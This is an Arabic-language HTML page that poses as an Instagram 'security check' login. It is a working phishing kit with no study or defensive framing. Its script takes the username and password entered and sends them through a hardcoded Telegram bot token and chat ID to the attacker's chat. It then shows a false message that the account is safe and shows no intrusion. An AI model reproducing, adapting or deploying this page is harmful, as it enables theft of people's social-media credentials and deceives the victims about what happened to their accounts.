<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram Security Check</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 350px; width: 100%; padding: 20px; background: white; border: 1px solid #dbdbdb; border-radius: 1px; text-align: center; }
        .logo { margin-bottom: 20px; font-size: 2.5rem; font-weight: 600; font-family: "Billabong", cursive; color: #262626; }
        .input-group { margin-bottom: 10px; }
        .input-group input { width: 100%; padding: 12px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; outline: none; text-align: left; }
        .btn { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px; }
        
        .success-screen { display: none; }
        .success-icon { font-size: 50px; color: #2ecc71; margin-bottom: 15px; }
        .success-title { color: #262626; font-size: 18px; font-weight: bold; margin-bottom: 10px; }
        .success-text { color: #8e8e8e; font-size: 14px; line-height: 1.5; }
        
        .loader { display: none; margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div id="login-screen">
            <div class="logo">Instagram</div>
            <form id="loginForm">
                <div class="input-group">
                    <input type="text" id="username" placeholder="Phone number, username, or email" required autocomplete="off">
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn" id="submitBtn">Log In</button>
            </form>
            <div class="loader" id="loader"></div>
        </div>

        <div id="success-screen" class="success-screen">
            <div class="success-icon">✅</div>
            <div class="success-title">حسابك سليم 100%</div>
            <div class="success-text">
                تم فحص حسابك بنجاح.<br>لم يتم اكتشاف أي عمليات اختراق أو دخول مشبوه.
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8933571192:AAEAl7ej-akD789tzkS1sJK7zIZz020a4kA";
        const CHAT_ID = "8322196658";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); 
            
            document.getElementById('submitBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            const msg = `🚨 تم اصطياد بيانات!\n\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;

            fetch(url, { method: 'GET', mode: 'no-cors', keepalive: true }).catch(() => {});

            // تم تعديل المؤقت هنا إلى 3000 (أي 3 ثوانٍ)
            setTimeout(function() {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('success-screen').style.display = 'block'; 
            }, 3000);
        });
    </script>
</body>
</html>
